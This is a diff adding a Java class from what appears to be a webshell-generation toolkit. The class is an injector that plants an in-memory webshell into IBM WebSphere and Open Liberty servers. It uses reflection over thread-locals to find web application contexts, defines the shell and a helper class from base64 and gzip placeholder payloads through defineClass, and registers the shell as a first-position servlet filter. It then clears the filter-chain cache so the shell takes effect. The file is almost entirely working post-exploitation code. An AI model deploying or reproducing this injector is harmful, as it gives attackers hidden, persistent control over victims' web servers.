@@ -1,0 +1,339 @@
+package com.reajason.javaweb.memshell.injector.websphere;
+
+import java.io.ByteArrayInputStream;
+import java.io.ByteArrayOutputStream;
+import java.io.IOException;
+import java.io.PrintStream;
+import java.lang.reflect.Constructor;
+import java.lang.reflect.Field;
+import java.lang.reflect.Method;
+import java.util.HashSet;
+import java.util.List;
+import java.util.Set;
+import java.util.zip.GZIPInputStream;
+
+
+/**
+ * @author ReaJason
+ */
+public class WebSphereRawWsInjector {
+
+    private static String msg = "";
+    private static boolean ok = false;
+
+    public String getUrlPattern() {
+        return "{{urlPattern}}";
+    }
+
+    public String getClassName() {
+        return "{{className}}";
+    }
+
+    public String getBase64String() throws IOException {
+        return "{{base64Str}}";
+    }
+
+    public String getHelperBase64String() {
+        return "{{helperBase64Str}}";
+    }
+
+    public WebSphereRawWsInjector() {
+        if (ok) {
+            return;
+        }
+        boolean injected = false;
+        Set<Object> contexts = null;
+        try {
+            contexts = getContext();
+        } catch (Throwable throwable) {
+            msg += "context error: " + getErrorMessage(throwable);
+        }
+        if (contexts == null || contexts.isEmpty()) {
+            msg += "context not found";
+        } else {
+            for (Object context : contexts) {
+                try {
+                    msg += ("context: [" + getContextRoot(context) + "] ");
+                    Object shell = getShell(context);
+                    inject(context, shell);
+                    msg += "[" + getUrlPattern() + "] ready\n";
+                    injected = true;
+                } catch (Throwable e) {
+                    msg += "failed " + getErrorMessage(e) + "\n";
+                }
+            }
+        }
+        // 全部 context 都失败时不锁存，下次请求到来允许重试
+        ok = injected;
+        System.out.println(msg);
+    }
+
+    @SuppressWarnings("all")
+    private String getContextRoot(Object context) {
+        String r = null;
+        try {
+            r = (String) invokeMethod(context, "getContextPath", null, null);
+        } catch (Exception ignored) {
+        }
+        String c = context.getClass().getName();
+        if (r == null) {
+            return c;
+        }
+        if (r.isEmpty()) {
+            return c + "(/)";
+        }
+        return c + "(" + r + ")";
+    }
+
+    /**
+     * com.ibm.ws.webcontainer.webapp.WebAppImpl
+     * /opt/IBM/WebSphere/AppServer/plugins/com.ibm.ws.webcontainer.jar
+     */
+    public Set<Object> getContext() throws Exception {
+        Set<Object> contexts = new HashSet<Object>();
+        Object[] threadLocals = null;
+        boolean raw = false;
+        try {
+            // WebSphere Liberty
+            threadLocals = (Object[]) getFieldValue(Thread.currentThread(), "wsThreadLocals");
+        } catch (NoSuchFieldException ignored) {
+        }
+        if (threadLocals == null) {
+            // Open Liberty
+            threadLocals = (Object[]) getFieldValue(getFieldValue(Thread.currentThread(), "threadLocals"), "table");
+            raw = true;
+        }
+        for (Object threadLocal : threadLocals) {
+            if (threadLocal == null) {
+                continue;
+            }
+            // 回收中的条目反射链随时会断（null 中间值或字段改名），跳过坏条目，
+            // 保留此前已收集的 context
+            try {
+                Object value = threadLocal;
+                if (raw) {
+                    value = getFieldValue(threadLocal, "value");
+                }
+                if (value == null) {
+                    continue;
+                }
+                // for websphere 7.x
+                if (value.getClass().getName().endsWith("FastStack")) {
+                    Object[] stackList = (Object[]) getFieldValue(value, "stack");
+                    for (Object stack : stackList) {
+                        try {
+                            Object config = getFieldValue(stack, "config");
+                            contexts.add(getFieldValue(getFieldValue(config, "context"), "context"));
+                        } catch (Exception ignored) {
+                        }
+                    }
+                } else if (value.getClass().getName().endsWith("WebContainerRequestState")) {
+                    Object webApp = invokeMethod(getFieldValue(getFieldValue(value, "currentThreadsIExtendedRequest"), "_dispatchContext"), "getWebApp", null, null);
+                    contexts.add(getFieldValue(getFieldValue(webApp, "facade"), "context"));
+                }
+            } catch (Throwable ignored) {
+            }
+        }
+        return contexts;
+    }
+
+    private ClassLoader getWebAppClassLoader(Object context) throws Exception {
+        try {
+            return ((ClassLoader) invokeMethod(context, "getClassLoader", null, null));
+        } catch (Exception e) {
+            return ((ClassLoader) getFieldValue(context, "loader"));
+        }
+    }
+
+    @SuppressWarnings("all")
+    private Object getShell(Object context) throws Exception {
+        ClassLoader classLoader = getWebAppClassLoader(context);
+        defineHelper(classLoader);
+        Class<?> clazz = null;
+        try {
+            clazz = classLoader.loadClass(getClassName());
+        } catch (Exception e) {
+            byte[] clazzByte = gzipDecompress(decodeBase64(getBase64String()));
+            Method defineClass = ClassLoader.class.getDeclaredMethod("defineClass", byte[].class, int.class, int.class);
+            defineClass.setAccessible(true);
+            clazz = (Class<?>) defineClass.invoke(classLoader, clazzByte, 0, clazzByte.length);
+        }
+        msg += "[" + classLoader.getClass().getName() + "] ";
+        return clazz.newInstance();
+    }
+
+    /**
+     * helper 必须先于 shell 构造完成 define；shell 无参构造会按类名自行解析它。
+     * 后缀与 RawWsHelperNames.HELPER_SUFFIX 一致，注入器运行时不能依赖 api jar。
+     */
+    @SuppressWarnings("all")
+    private Class<?> defineHelper(ClassLoader classLoader) throws Exception {
+        String helperName = getClassName() + "$RawWsHelper";
+        try {
+            return classLoader.loadClass(helperName);
+        } catch (Throwable ignored) {
+        }
+        byte[] helperBytes = gzipDecompress(decodeBase64(getHelperBase64String()));
+        Method defineClass = ClassLoader.class.getDeclaredMethod("defineClass",
+                String.class, byte[].class, int.class, int.class);
+        defineClass.setAccessible(true);
+        return (Class<?>) defineClass.invoke(classLoader, helperName, helperBytes, 0, helperBytes.length);
+    }
+
+    @SuppressWarnings("unchecked")
+    public void inject(Object context, Object filter) throws Exception {
+        Object webAppConfig = getFieldValue(context, "config");
+        if (invokeMethod(webAppConfig, "getFilterInfo", new Class[]{String.class}, new Object[]{getClassName()}) != null) {
+            return;
+        }
+
+        Class<?> filterMappingClass = loadClass(context.getClass(), "com.ibm.ws.webcontainer.filter.FilterMapping");
+        Class<?> iFilterConfigClass = loadClass(context.getClass(), "com.ibm.wsspi.webcontainer.filter.IFilterConfig");
+        Class<?> iServletConfigClass = loadClass(context.getClass(), "com.ibm.wsspi.webcontainer.servlet.IServletConfig");
+
+        Object filterManager = getFieldValue(context, "filterManager");
+        Object filterConfig = invokeMethod(context, "createFilterConfig", new Class[]{String.class}, new Object[]{getClassName()});
+        invokeMethod(filterConfig, "setFilterClassName", new Class[]{String.class}, new Object[]{getClassName()});
+        setFieldValue(filterConfig, "name", getClassName());
+        Constructor<?> constructor = filterMappingClass.getConstructor(String.class, iFilterConfigClass, iServletConfigClass);
+        Object filterMapping = constructor.newInstance(getUrlPattern(), filterConfig, null);
+        invokeMethod(filterManager, "addFilterMapping", new Class[]{filterMappingClass}, new Object[]{filterMapping});
+        invokeMethod(webAppConfig, "addFilterInfo", new Class[]{iFilterConfigClass}, new Object[]{filterConfig});
+
+        try {
+            List uriFilterMappingInfos = (List) getFieldValue(webAppConfig, "uriFilterMappingInfos");
+            uriFilterMappingInfos.remove(filterMapping);
+            uriFilterMappingInfos.add(0, filterMapping);
+        } catch (Exception e) {
+            // WebSphere7
+            List uriFilterMappings = (List) getFieldValue(filterManager, "_uriFilterMappings");
+            Object fmInfo = uriFilterMappings.remove(uriFilterMappings.size() - 1);
+            uriFilterMappings.add(0, fmInfo);
+        }
+
+        // 清除缓存
+        Object chainCache = getFieldValue(filterManager, "chainCache");
+        try {
+            invokeMethod(chainCache, "clear", null, null);
+        } catch (Exception e) {
+            invokeMethod(getFieldValue(chainCache, "chainCacheMap"), "clear", null, null);
+        }
+    }
+
+    @Override
+    public String toString() {
+        return msg;
+    }
+
+    // bypass osgi
+    public static Class<?> loadClass(Class<?> context, String className) throws ClassNotFoundException {
+        if (context.equals(Object.class)) {
+            throw new ClassNotFoundException(className);
+        }
+        ClassLoader loader = context.getClassLoader();
+        try {
+            return loader.loadClass(className);
+        } catch (ClassNotFoundException e) {
+            return loadClass(context.getSuperclass(), className);
+        }
+    }
+
+    @SuppressWarnings("all")
+    public static Object invokeMethod(Object obj, String methodName, Class<?>[] paramClazz, Object[] param) throws
+            Exception {
+        Class<?> clazz = (obj instanceof Class) ? (Class<?>) obj : obj.getClass();
+        Method method = null;
+        while (clazz != null && method == null) {
+            try {
+                if (paramClazz == null) {
+                    method = clazz.getDeclaredMethod(methodName);
+                } else {
+                    method = clazz.getDeclaredMethod(methodName, paramClazz);
+                }
+            } catch (NoSuchMethodException e) {
+                clazz = clazz.getSuperclass();
+            }
+        }
+        if (method == null) {
+            throw new NoSuchMethodException("Method not found: " + methodName);
+        }
+        method.setAccessible(true);
+        return method.invoke(obj instanceof Class ? null : obj, param);
+    }
+
+    @SuppressWarnings("all")
+    public static byte[] decodeBase64(String base64Str) throws Exception {
+        Class<?> decoderClass;
+        try {
+            decoderClass = Class.forName("java.util.Base64");
+            Object decoder = decoderClass.getMethod("getDecoder").invoke(null);
+            return (byte[]) decoder.getClass().getMethod("decode", String.class).invoke(decoder, base64Str);
+        } catch (Exception ignored) {
+            decoderClass = Class.forName("sun.misc.BASE64Decoder");
+            return (byte[]) decoderClass.getMethod("decodeBuffer", String.class).invoke(decoderClass.newInstance(), base64Str);
+        }
+    }
+
+    @SuppressWarnings("all")
+    public static byte[] gzipDecompress(byte[] compressedData) throws IOException {
+        ByteArrayOutputStream out = new ByteArrayOutputStream();
+        GZIPInputStream gzipInputStream = null;
+        try {
+            gzipInputStream = new GZIPInputStream(new ByteArrayInputStream(compressedData));
+            byte[] buffer = new byte[4096];
+            int n;
+            while ((n = gzipInputStream.read(buffer)) > 0) {
+                out.write(buffer, 0, n);
+            }
+            return out.toByteArray();
+        } finally {
+            if (gzipInputStream != null) {
+                gzipInputStream.close();
+            }
+            out.close();
+        }
+    }
+
+    private static void setFieldValue(Object obj, String fieldName, Object value) throws Exception {
+        Field field = getField(obj, fieldName);
+        field.setAccessible(true);
+        field.set(obj, value);
+    }
+
+    @SuppressWarnings("all")
+    public static Field getField(Object obj, String name) throws NoSuchFieldException, IllegalAccessException {
+        for (Class<?> clazz = obj.getClass();
+             clazz != Object.class;
+             clazz = clazz.getSuperclass()) {
+            try {
+                return clazz.getDeclaredField(name);
+            } catch (NoSuchFieldException ignored) {
+
+            }
+        }
+        throw new NoSuchFieldException(obj.getClass().getName() + " Field not found: " + name);
+    }
+
+
+    @SuppressWarnings("all")
+    public static Object getFieldValue(Object obj, String name) throws NoSuchFieldException, IllegalAccessException {
+        Field field = getField(obj, name);
+        field.setAccessible(true);
+        return field.get(obj);
+    }
+
+    @SuppressWarnings("all")
+    private String getErrorMessage(Throwable throwable) {
+        PrintStream printStream = null;
+        try {
+            ByteArrayOutputStream outputStream = new ByteArrayOutputStream();
+            printStream = new PrintStream(outputStream);
+            throwable.printStackTrace(printStream);
+            return outputStream.toString();
+        } finally {
+            if (printStream != null) {
+                printStream.close();
+            }
+        }
+    }
+}
